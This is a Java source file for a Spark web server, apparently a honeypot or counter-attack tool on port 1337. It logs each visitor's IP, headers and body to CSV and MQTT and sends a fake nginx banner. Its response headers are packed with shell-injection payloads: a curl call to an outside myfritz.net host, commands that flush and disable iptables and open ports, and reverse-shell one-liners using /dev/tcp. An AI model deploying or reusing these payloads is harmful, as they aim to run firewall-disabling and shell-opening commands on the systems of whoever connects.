package tech.cybersword;

import static spark.Spark.before;
import static spark.Spark.get;
import static spark.Spark.port;

import java.io.FileWriter;
import java.io.IOException;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class CCS {
    private static final Logger logger = LogManager.getLogger(CCS.class);
    private static final String CSV_FILE = "./logs/tech.cybersword.java.command.control.csv";

    public static void main(String[] args) {
        port(1337);

        logger.info("start 1337 server");

        MqttPublisher mqttPublisher = new MqttPublisher();

        before((request, response) -> {

            String clientIP = request.ip();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            response.header("Server", "nginx/1.14.0 (Ubuntu)");
            response.header("system(\"curl http://25mpgaahipvzi40q.myfritz.net:1337/pentest\")",
                    "system(\"curl http://25mpgaahipvzi40q.myfritz.net:1337/pentest\")");
            response.header("system(\"touch pentest\")", "system(\"touch pentest\")");
            response.header("system(\"iptables -F\")", "system(\"iptables -F\")");
            response.header("system(\"iptables -X\")", "system(\"iptables -X\")");
            response.header("system(\"iptables -Z\")", "system(\"iptables -Z\")");
            response.header("system(\"iptables -t nat -F\")", "system(\"iptables -t nat -F\")");
            response.header("system(\"iptables -t nat -X\")", "system(\"iptables -t nat -X\")");
            response.header("system(\"iptables -t nat -Z\")", "system(\"iptables -t nat -Z\")");
            response.header("system(\"iptables -A INPUT -p tcp --dport 22 -j ACCEPT\")",
                    "system(\"iptables -A INPUT -p tcp --dport 22 -j ACCEPT\")");
            response.header("system(\"systemctl stop iptables\")", "system(\"systemctl stop iptables\")");
            response.header("system(\"systemctl disable iptables\")", "system(\"systemctl disable iptables\")");
            response.header("system(\"iptables -A INPUT -p tcp --dport 1337 -j ACCEPT\")",
                    "system(\"iptables -A INPUT -p tcp --dport 1337 -j ACCEPT\")");
            response.header("system(\"sh -i >& /dev/tcp/localhost/1337 0>&1\")",
                    "system(\"sh -i >& /dev/tcp/localhost/1337 0>&1\")");
            response.header("system(\"sh -i >& /dev/tcp/127.0.0.1/1337 0>&1\")",
                    "system(\"sh -i >& /dev/tcp/127.0.0.1/1337 0>&1\")");

            response.header("", "");

            response.header("X-Forwarded-For", clientIP);
            response.header("X-Forwarded-For", "0.0.0.0");
            
            response.header("Forwarded", "0.0.0.0");
            response.header("Forwarded", "-1");
            response.header("X-Real-IP", "0.0.0.0");
            response.header("True-Client-IP", "-1");
            // ...


            String ipDateStr = formattedDateTime.concat("_" + clientIP);

            mqttPublisher.sendMQTT(ipDateStr);

            try {
                appendToCsv(formattedDateTime, clientIP);
            } catch (IOException e) {
                logger.error("error on log in csv file: ", e);
            }

            String message1 = request.requestMethod() + "_" + request.pathInfo();

            mqttPublisher.sendMQTT(message1);

            logger.info("Request method: {}, path: {}", request.requestMethod(), request.pathInfo());

            request.queryMap().toMap()
                    .forEach((key, value) -> logger.info("Query-parameter: {} = {}", key, String.join(", ", value)));

            request.headers().forEach(header -> logger.info("Header: {} = {}", header, request.headers(header)));

            if (request.contentLength() > 0) {
                logger.info("Body: {}", request.body());
            }
        });

        get("/1", (req, res) -> {
            String clientIP = req.ip();
            logger.info(String.format("request from %s on http endpoint 1 %n %s", clientIP, req.toString()));
            return clientIP;
        });

        get("/2", (req, res) -> {
            String clientIP = req.ip();
            logger.info(String.format("request from %s on http endpoint 2 %n %s", clientIP, req.toString()));
            return clientIP;
        });
    }

    private static void appendToCsv(String dateTime, String ip) throws IOException {
        try (FileWriter writer = new FileWriter(CSV_FILE, true)) {
            writer.append(dateTime);
            writer.append(',');
            writer.append(ip);
            writer.append('\n');
            writer.flush();
        }
    }
}
